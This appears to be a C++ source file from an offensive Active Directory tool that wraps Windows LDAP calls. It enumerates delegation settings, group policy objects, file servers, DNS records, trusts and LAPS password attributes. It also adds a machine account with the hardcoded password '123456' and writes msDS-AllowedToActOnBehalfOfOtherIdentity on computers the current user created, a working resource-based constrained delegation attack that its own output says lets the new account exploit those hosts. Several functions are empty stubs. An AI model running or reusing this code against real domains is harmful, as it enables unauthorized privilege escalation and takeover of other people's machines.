#include "m_ldap_api.h"
#define DEBUG 1
LDAP_API::LDAP_API(string username, string password, string ldapServerAddr, string domainName)
{
	this->pLdapInstance = NULL;
	this->pLdapMessage = NULL;
	this->pEntry = NULL;
	this->ldapServerAddr = ldapServerAddr;
	this->domainName = domainName;
	this->username = username;
	this->password = password;
	this->defaultTimeVal.tv_sec = 1;
	this->init();
	this->initBaseDn();
}
 
LDAP_API::LDAP_API(string ldapServerAddr, string domainName)
{
	this->pLdapInstance = NULL;
	this->pLdapMessage = NULL;
	this->pEntry = NULL;
	this->ldapServerAddr = ldapServerAddr;
	this->domainName = domainName;
	this->defaultTimeVal.tv_sec = 1;
	this->init();
}

LDAP_API::~LDAP_API()
{
	this->closeLdapConnection();
}

void LDAP_API::closeLdapConnection(){
	if (this->pLdapMessage != NULL){
		ldap_msgfree(this->pLdapMessage);
		this->pLdapMessage = NULL;
	}
	if (this->pLdapInstance != NULL){
		ldap_unbind_s(this->pLdapInstance);
		this->pLdapInstance = NULL;
	}
}


void LDAP_API::init(){
	this->initBaseDn();
	this->pLdapInstance = ldap_init((PSTR)this->ldapServerAddr.c_str(), LDAP_PORT);
	if (this->setLdapOption() == LDAP_SUCCESS){
		if (this->connect() == LDAP_SUCCESS){
			if (this->bind() == LDAP_SUCCESS){
				cout << "[+] LDAP::init Successed" << endl;
			}
		}
	}
}

void LDAP_API::initBaseDn(){
	vector<string> vString = split(this->domainName, ".");
	this->baseDn = "DC=" + vString[0] + ",DC=" + vString[1];
}


SEC_WINNT_AUTH_IDENTITY_W LDAP_API::initLdapCreds(){
	SEC_WINNT_AUTH_IDENTITY_W secAuthIdentity;
	
	secAuthIdentity.Domain = (USHORT*)this->ldapServerAddr.c_str();
	secAuthIdentity.DomainLength = lstrlen(this->ldapServerAddr.c_str());
	
	secAuthIdentity.User = (USHORT*)this->username.c_str();
	secAuthIdentity.UserLength = lstrlen(this->username.c_str());
	
	secAuthIdentity.Password = (USHORT*)this->password.c_str();
	secAuthIdentity.PasswordLength = lstrlen(this->password.c_str());

	secAuthIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;
	return secAuthIdentity;
}
 
DWORD LDAP_API::setLdapOption(){
	DWORD dwRet;

	dwRet = ldap_set_option(this->pLdapInstance, LDAP_OPT_PROTOCOL_VERSION, (void*)LDAP_VERSION3);
	if (dwRet == LDAP_SUCCESS){
#ifdef DEBUG
		cout << "[+] LDAP::setLdapOption LDAP_OPT_PROTOCOL_VERSION Successed" << endl;
#else
#endif
		dwRet = ldap_set_option(this->pLdapInstance, LDAP_OPT_ENCRYPT, LDAP_OPT_ON);
		if (dwRet == LDAP_SUCCESS){
#ifdef DEBUG
			cout << "[+] LDAP::setLdapOption LDAP_OPT_ENCRYPT Successed" << endl;
#else
#endif
			dwRet = ldap_set_option(this->pLdapInstance, LDAP_OPT_SIGN, LDAP_OPT_ON);
			if (dwRet == LDAP_SUCCESS){
#ifdef DEBUG
				cout << "[+] LDAP::setLdapOption LDAP_OPT_SIGN Successed" << endl;
#else
#endif
				return LDAP_SUCCESS;
			}
			else{
				cout << "[-] LDAP::setLdapOption Failed" << endl;
				return LDAP_OPERATIONS_ERROR;
			}
		}
		else{
			cout << "[-] LDAP::setLdapOption Failed" << endl;
			return LDAP_OPERATIONS_ERROR;
		}
	}
	else{
		cout << "[-] LDAP::setLdapOption Failed" << endl;
		return LDAP_OPERATIONS_ERROR;
	}
}

DWORD LDAP_API::connect(){
	DWORD dwRet = ldap_connect(this->pLdapInstance, &defaultTimeVal);
	if (dwRet == LDAP_SUCCESS){
#ifdef DEBUG
		cout << "[+] LDAP::connect Successed" << endl;
#else
#endif
		return LDAP_SUCCESS;
	}
	else{
		cout << "[-] LDAP::connect Failed" << endl;
		this->closeLdapConnection();
		return LDAP_OPERATIONS_ERROR;
	}
}

DWORD LDAP_API::bind(){
	DWORD dwRet;
	if (!this->password.empty()){
		SEC_WINNT_AUTH_IDENTITY_W secAuthIdentity = this->initLdapCreds();
		dwRet = ldap_bind_s(this->pLdapInstance, (PSTR)this->baseDn.c_str(), (PCHAR)&secAuthIdentity, LDAP_AUTH_NEGOTIATE);
		if (dwRet != -1){
#ifdef DEBUG
			cout << "[+] LDAP::bind Successed" << endl;
#else
#endif
			return LDAP_SUCCESS;
		}
		else{
			cout << "[-] LDAP::bind Failed" << endl;
			this->closeLdapConnection();
			return LDAP_OPERATIONS_ERROR;
		}
	}
	else{
		dwRet = ldap_bind_s(this->pLdapInstance, NULL, NULL, LDAP_AUTH_NEGOTIATE);
		if (dwRet != -1){
#ifdef DEBUG
			cout << "[+] LDAP::bind - default current user Successed" << endl;
#else
#endif
			return LDAP_SUCCESS;
		}
		else{
			cout << "[-] LDAP::bind Failed" << endl;
			this->closeLdapConnection();
			return LDAP_OPERATIONS_ERROR;
		}
	}
}

/*大部分都参考了ske大师兄的，因为写的比较完全了，比如基于资源的约束委派方面上相关的SID获取用户名其实都写了*/
// 方法都不完善，如果以后要扩充的话，这个search方法需要重写的
vector<string> LDAP_API::search(string filterGrammar, string dn, PCHAR searchAttabuite[]){
	vector<string> vString;
	DWORD dwRet = ldap_search_s(this->pLdapInstance, (PSTR)dn.c_str(), LDAP_SCOPE_SUBTREE, (PSTR)filterGrammar.c_str(),
		(PZPSTR)searchAttabuite, 0, &this->pLdapMessage);
	if (dwRet == LDAP_SUCCESS){
		DWORD numberOfEntries = ldap_count_entries(
			this->pLdapInstance,    // Session handle
			this->pLdapMessage);     // Search result

		if (numberOfEntries != NULL)
		{
			//----------------------------------------------------------
			// Loop through the search entries, get, and output the
			// requested list of attributes and values.
			//----------------------------------------------------------
			LDAPMessage* pEntry = NULL;
			PCHAR pEntryDN = NULL;
			ULONG iCnt = 0;
			BerElement* pBer = NULL;
			PCHAR pAttribute = NULL;
			PCHAR* ppValue = NULL;
			ULONG iValue = 0;
			
			for (iCnt = 0; iCnt < numberOfEntries; iCnt++)
			{
				// Get the first/next entry.
				if (!iCnt)
					pEntry = ldap_first_entry(this->pLdapInstance, this->pLdapMessage);
				else
					pEntry = ldap_next_entry(this->pLdapInstance, pEntry);
				
				if (pEntry != NULL){
					// Get the first attribute name.
					pAttribute = ldap_first_attribute(this->pLdapInstance, pEntry, &pBer);
					while (pAttribute != NULL){
						// 这种情况就是如果ppValue是sid的时候，需要手动进行转换成用户下，否则输出是未知数据
						if (CompareString(GetThreadLocale(), NORM_IGNORECASE, pAttribute, lstrlen(pAttribute), "mS-DS-CreatorSID", lstrlen("mS-DS-CreatorSID")) == 2){
							LDAP_BERVAL** berVal = NULL;
							string domainUser;
							PSID pSid = NULL;
							if (berVal = ldap_get_values_len(this->pLdapInstance, pEntry, pAttribute)){
								for (int i = 0; berVal[i]; i++)
								{
									string sid = ConvertToStringSid((const unsigned char*)berVal[i]->bv_val, berVal[i]->bv_len);
									ConvertStringSidToSid(sid.c_str(), &pSid);
									domainUser = sid2user(pSid, this->ldapServerAddr.c_str());
									cout << pAttribute << "=" << sid << " ----> " << domainUser;
								}
								ldap_value_free_len(berVal);
							}
						}
						else if (CompareString(GetThreadLocale(), NORM_IGNORECASE, pAttribute, lstrlen(pAttribute), "objectSid", lstrlen("objectSid")) == 2){
							LDAP_BERVAL** berVal = NULL;
							if (berVal = ldap_get_values_len(this->pLdapInstance, pEntry, pAttribute)){
								for (int i = 0; berVal[i]; i++)
								{
									string sid = ConvertToStringSid((const unsigned char*)berVal[i]->bv_val, berVal[i]->bv_len);
									vString.push_back(sid);
								}
								ldap_value_free_len(berVal);
							}
						}
						else if (CompareString(GetThreadLocale(), NORM_IGNORECASE, pAttribute, lstrlen(pAttribute), "dnsRecord", lstrlen("dnsRecord")) == 2){
							LDAP_BERVAL** berVal = NULL;
							berVal = ldap_get_values_len(this->pLdapInstance, pEntry, pAttribute);
							if (berVal = ldap_get_values_len(this->pLdapInstance, pEntry, pAttribute)){
								char szAddrBuffer[0x10] = { 0 };
								DNS_RPC_RECORD* d = (DNS_RPC_RECORD*)berVal[0]->bv_val;
								sprintf(szAddrBuffer, "%d.%d.%d.%d", d->addr.address[0], d->addr.address[1], d->addr.address[2], d->addr.address[3]);
								cout << "\t" << pAttribute << "=" << szAddrBuffer << endl << " ";
								ldap_value_free_len(berVal);
							}
							
						}
						else{
							// get common attribute
							ppValue = ldap_get_values(this->pLdapInstance, pEntry, pAttribute);
							cout << "\t" << pAttribute << "=" << *ppValue << " ";
							vString.push_back(*ppValue);
							
							// Free memory.
							if (ppValue != NULL)
								ldap_value_free(ppValue);

							ppValue = NULL;
							ldap_memfree(pAttribute);
							
						}
					

						// Get next attribute name.
						pAttribute = ldap_next_attribute(
							this->pLdapInstance,   // Session Handle
							pEntry,            // Current entry
							pBer);             // Current BerElement
					}
				}
				else{
					this->closeLdapConnection();
				}
				cout << endl;
			}
			cout << endl;
		}else{
			cout << "[-] LDAP::ldap_count_entries Failed" << endl;
			this->closeLdapConnection();
		}
	}
	else{
		cout << "[-] LDAP::ldap_search_s Failed, The Error is " << dwRet << endl;
		this->closeLdapConnection();
		// exit(-1);
	}
	return vString;
	
}

void LDAP_API::searchConstrainedDelegation(){
	PCHAR pAttributes[] = {"msds-allowedtodelegateto", "cn", NULL };
	this->search("(&(samAccountType=805306368)(msds-allowedtodelegateto=*))", this->baseDn, pAttributes);
}

void LDAP_API::searchUnconstrainedDelegation(){
	PCHAR pAttributes[] = {"userAccountControl", "cn", NULL };
	this->search("(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))", this->baseDn, pAttributes);
}

void LDAP_API::searchResourceBasedConstrainedDelegation(){
	PCHAR pAttributes[] = {"mS-DS-CreatorSID", "cn", NULL };
	this->search("(&(ObjectClass=computer)(mS-DS-CreatorSID=*))", this->baseDn, pAttributes);
}

vector<string> LDAP_API::getObjectSid(string pcName){
	PCHAR pAttributes[] = { "objectSid", NULL };
	string grammarString = "(sAMAccountName=" + pcName + "$)";
	return this->search(grammarString.c_str(), this->baseDn, pAttributes);
}

string LDAP_API::getComputerDn(){
	PCHAR pAttributes[] = { "distinguishedName", NULL };

	TCHAR szBufferComputerName[MAX_COMPUTERNAME_LENGTH+1] = { 0 };
	DWORD dwComputerSize;
	GetComputerName(szBufferComputerName, &dwComputerSize);
	
	string grammarString = "(sAMAccountName=" + string(szBufferComputerName) + "$)";
	vector<string> vString = this->search(grammarString.c_str(), this->baseDn, pAttributes);
	return vString[0];
}

string LDAP_API::addComputer(string pcName){
	DWORD dwComputerSize;
	TCHAR currentComputerName[MAX_COMPUTERNAME_LENGTH+1] = { 0 };
	GetComputerName(currentComputerName, &dwComputerSize);

	regex_constants::match_flag_type fonly = regex_constants::format_first_only;
	regex matchString(currentComputerName);

	string computerDnString = this->getComputerDn();
	cout << "[+] Getting computerDn ----> " << computerDnString << endl;
	string addComputerDnString = regex_replace(computerDnString, matchString, pcName, fonly);
	LDAPMod m1, m2, m3, m4, m5, m6;
	string dnsHostNameString = pcName + "." + this->domainName;
	TCHAR* dnsHostNameVals[] = { (TCHAR*)dnsHostNameString.c_str(), NULL };
	m1.mod_op = LDAP_MOD_ADD;
	m1.mod_type = "DnsHostName";
	m1.mod_values = dnsHostNameVals;

	string samAccountNameString = pcName + "$";
	TCHAR* samAccountNameVals[] = { (TCHAR*)samAccountNameString.c_str(), NULL };
	m2.mod_op = LDAP_MOD_ADD;
	m2.mod_type = "SamAccountName";
	m2.mod_values = samAccountNameVals;

	TCHAR* userAccountControlVals[] = { "4096", NULL };
	m3.mod_op = LDAP_MOD_ADD;
	m3.mod_type = "userAccountControl";
	m3.mod_values = userAccountControlVals;
	
	string unicodePwdString = "\"123456\"";
	BerValue bv; 
	bv.bv_val = new char[(unicodePwdString.length()) * 2];
	memset(bv.bv_val, 0, unicodePwdString.length() * 2);
	for (UINT i = 0; i < unicodePwdString.length(); i++) {
		bv.bv_val[i * 2] = unicodePwdString[i];
	}
	bv.bv_len = unicodePwdString.length() * 2;
	BerValue* unicodePwdVals[] = { &bv, NULL };
	m4.mod_op = LDAP_MOD_ADD | LDAP_MOD_BVALUES;
	m4.mod_type = "unicodePwd";
	m4.mod_bvalues = unicodePwdVals;
	
	TCHAR* objectClassVals[] = { "Computer", NULL };
	m5.mod_op = LDAP_MOD_ADD;
	m5.mod_type = "objectClass";
	m5.mod_values = objectClassVals;
	
	string a1 = "HOST/" + pcName + "." + this->domainName;
	string a2 = "RestrictedKrbHost/" + pcName + "." + this->domainName;
	string a3 = "HOST/" + pcName;
	string a4 = "RestrictedKrbHost/" + pcName;
	
	TCHAR* servicePrincipalNameVals[] = { (TCHAR*)a1.c_str(), (TCHAR*)a2.c_str(), (TCHAR*)a3.c_str(), (TCHAR*)a4.c_str(),NULL };
	m6.mod_op = LDAP_MOD_ADD;
	m6.mod_type = "ServicePrincipalName";
	m6.mod_values = servicePrincipalNameVals;

	LDAPMod* pModAttrs[7] = { &m1, &m2, &m3, &m4, &m5, &m6, NULL };
	//string userSid = this->getCurrentUserSid();
	//MACHINE_ACCOUNT_ATTRIBUTE machineAccountAttribute;
	
	DWORD dwRet = ldap_add_ext_s(this->pLdapInstance, (PSTR)addComputerDnString.c_str(), pModAttrs, NULL, NULL);
	if (dwRet == LDAP_SUCCESS){
		cout << "[+] LDAP::addComputer Add Successed, Password is 123456" << endl;
		delete bv.bv_val;
		vector<string> vString = this->getObjectSid(pcName);
		return vString[0];
	}else{
		cout << "[-] LDAP::addComputer Add Failed, The Error is " << dwRet << endl;
		delete bv.bv_val;
		return "";
	}
}

// https://www.cnblogs.com/unicodeSec/p/15348117.html 思路来源
void LDAP_API::addDnsRecord(string dnsName, string ipName){
	string dn = "DC=" + dnsName + ",DC=" + this->domainName + ",CN=MicrosoftDNS,DC=DomainDnsZones," + this->baseDn;
	// template: "DC=WIN-SKE-PC,DC=hengge.com,CN=MicrosoftDNS,DC=DomainDnsZones,DC=hengge,DC=com"
	

	/*
	当字符串字节数小于128的时候:

	04 0a                              ; OCTET_STRING (a Bytes)
	|     1e 08 00 55 00 73 00 65  00 72  ;   ...U.s.e.r

	解析

	04 代表 OCTET_STRING 这个结构(参看基本类型汇总表)

	0a 代表 字节的数量（a Bytes）
	*/
	
	
}

// https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/ 思路来源
void LDAP_API::updateResourceBasedConstrainedDelegation(string pcName){
	string currentUserCreatorSid = this->getCurrentUserSid(this->domainName);
	cout << "[+] CurrentCreatorSid ----> "  << currentUserCreatorSid << endl;
	
	// 找到当前mS-DS-CreatorSID为当前用户的CN
	vector<string> vCnString;
	string fmtCreatorSid = "(mS-DS-CreatorSID=" + currentUserCreatorSid + ")";
	PCHAR pAttributes[] = { "cn", NULL };
	cout << "[+] Checking " << fmtCreatorSid << endl;
	
	// 当前CreatorSid的所有机器名称
	vCnString = this->search(fmtCreatorSid, this->baseDn, pAttributes);
	
	wstring addComputerSidString = string2Wstring(addComputer(pcName));
	//wstring addComputerSidString = L"S-1-5-21-4223269421-3390898629-3395902804-1132"; // 新添加机器的objectSid
	
	DWORD dwComputerSize;
	TCHAR currentComputerName[MAX_COMPUTERNAME_LENGTH+1] = { 0 };
	GetComputerName(currentComputerName, &dwComputerSize);
	regex_constants::match_flag_type fonly = regex_constants::format_first_only;
	regex matchString(currentComputerName);
	string computerDnString = this->getComputerDn();

	if (!vCnString.empty()){
		// 遍历取出可以基于资源委派的机器名
		// 对所有可以进行资源委派的机器名设置对应的字段msDS-AllowedToActOnBehalfOfOtherIdentity为当前的用户SID
		for (unsigned int i = 0; i<vCnString.size(); i++){
			// 添加msDS-AllowedToActOnBehalfOfOtherIdentity
			// computer dn = "CN=test1,DC=hengge,DC=com,CN=Computers"
			// CN=ttkq,CN=Computers,DC=hengge,DC=com
			// D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4223269421-3390898629-3395902804-1119)
			// O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4223269421-3390898629-3395902804-1119)
			wstring msDSAllowedToActOnBehalfOfOtherIdentityString = L"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + addComputerSidString + L")";
			//SECURITY_ATTRIBUTES securityAttr;
			//securityAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
			//securityAttr.bInheritHandle = FALSE;
			//ConvertStringSecurityDescriptorToSecurityDescriptor(msDSAllowedToActOnBehalfOfOtherIdentityString.c_str(), SDDL_REVISION_1, &securityAttr.lpSecurityDescriptor, NULL);
			//SECURITY_ATTRIBUTES* msDSAllowedToActOnBehalfOfOtherIdentityVals[] = { &securityAttr, NULL };
			//TCHAR* msDSAllowedToActOnBehalfOfOtherIdentityVals[] = { (PSTR)msDSAllowedToActOnBehalfOfOtherIdentityString.c_str(), NULL };
			
			IDirectoryObject* pDirObject = NULL;
			HRESULT hr;
			
			wstring computerDnWstring = L"LDAP://" + string2Wstring(regex_replace(computerDnString, matchString, vCnString[i], fonly));
			wcout << L"[+] " << computerDnWstring << endl;

			CoInitialize(NULL);
			hr = ADsOpenObject(computerDnWstring.c_str(),
				NULL,
				NULL,
				ADS_SECURE_AUTHENTICATION,
				IID_IDirectoryObject,
				(void**)&pDirObject);
			
			if (SUCCEEDED(hr)){
				DWORD dwSaLength;
				PSECURITY_ATTRIBUTES pSa = new SECURITY_ATTRIBUTES();
				pSa->nLength = sizeof(SECURITY_ATTRIBUTES);
				pSa->bInheritHandle = FALSE;
				ConvertStringSecurityDescriptorToSecurityDescriptorW(msDSAllowedToActOnBehalfOfOtherIdentityString.c_str(), SDDL_REVISION_1, &(pSa->lpSecurityDescriptor), &dwSaLength);
				
				ADS_NT_SECURITY_DESCRIPTOR ntSecurtyDesc;
				ntSecurtyDesc.lpValue = (LPBYTE)pSa->lpSecurityDescriptor;
				ntSecurtyDesc.dwLength = dwSaLength;
				
				ADSVALUE attrValue;
				attrValue.dwType = ADSTYPE_NT_SECURITY_DESCRIPTOR;
				attrValue.SecurityDescriptor = ntSecurtyDesc;
				
				ADS_ATTR_INFO attrInfo[] = { { L"msds-allowedtoactonbehalfofotheridentity", ADS_ATTR_UPDATE,
					ADSTYPE_NT_SECURITY_DESCRIPTOR, &attrValue, 1 } };
				DWORD dwAttrs = sizeof(attrInfo) / sizeof(ADS_ATTR_INFO);
				
				DWORD dwReturn;
				hr = pDirObject->SetObjectAttributes(attrInfo, dwAttrs, &dwReturn);
				
				if (SUCCEEDED(hr)){
					cout << "[+] msDS-AllowedToActOnBehalfOfOtherIdentity Attributes Add Succussed" << endl;
					cout << "[+] " << pcName << "$" << " Can Via S4u2self To Exploit " << vCnString[i] << "$" << endl;
				}
				else
					cout << "[-] msDS-AllowedToActOnBehalfOfOtherIdentity Attributes Add Failed, The Error is " << LdapGetLastError() << endl;;
				
				// 释放相关的内存
				pDirObject->Release();
				this->closeLdapConnection();
				if (pSa != NULL){
					delete pSa;
					pSa = NULL;
				}
			}
			
		}

		// 清空容器
		vCnString.clear();
		// 释放COM套件
		CoUninitialize();
	}
	else{
		cout << "[-] Current User Sid No Machine Can Exploit" << endl;
	}
}

// https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/ 思路来源
void LDAP_API::updatePrivilege(){
	// 本地服务账户的权限提升
}

// https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 思路来源
void LDAP_API::searchGPO(){
	string dn = "CN=Policies,CN=System," + this->baseDn;
	PCHAR pAttributes[] = { "gPCFileSysPath", NULL };
	this->search("(objectCategory=groupPolicyContainer)", dn, pAttributes);

}


// https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 思路来源
void LDAP_API::searchDomainFileServer(){
	PCHAR pAttributes[] = { "homedirectory", "scriptpath", "profilepath", NULL };
	this->search("(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))", this->baseDn, pAttributes);
}


// dnscmd 思路来源
void LDAP_API::searchDnsRecord(){
	string dn = "DC=" + this->domainName + ",CN=MicrosoftDNS,DC=DomainDnsZones," + this->baseDn;
	PCHAR pAttributes[] = { "name", "dnsRecord", NULL };
	this->search("(objectCategory=dnsNode)", this->baseDn, pAttributes);
}

// https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 思路来源

void LDAP_API::searchTrustDomain(){
	PCHAR pAttributes[] = { "TargetName", NULL };
	this->search("(objectClass=trustedDomain)", this->baseDn, pAttributes);
}

void LDAP_API::searchLAPs(){
	PCHAR pAttributes[] = { "ms-Mcs-AdmPwd", NULL };
	this->search("(objectClass=trustedDomain)", this->baseDn, pAttributes);
}